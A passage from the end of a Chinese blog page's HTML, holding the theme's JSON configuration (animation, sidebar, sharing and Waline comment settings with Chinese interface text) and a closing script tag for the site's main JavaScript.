毫秒）","placeholder":"搜索..."},"isMultiLang":false,"lang":"zh-CN","lazyload":false,"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":false,"plugin":"waline3"},"views":{"enable":true,"plugin":"waline3"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":false},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://blogs.qipai360.cn/js/3rd"}},"version":"4.8.3","waline3":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o 可用快捷键选取表情符号：😀😄😁🥳👻👽👀🚄 (Window系统：Win+.，Mac系统：Control+Command+Space)","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"search":true,"serverurl":"https://walinejs.comment.lithub.cc","sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"3.5.7"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"3.5.7"}}}</script><script type=text/javascript src="/js/main.min.js?=1772265585" defer></script></body></html>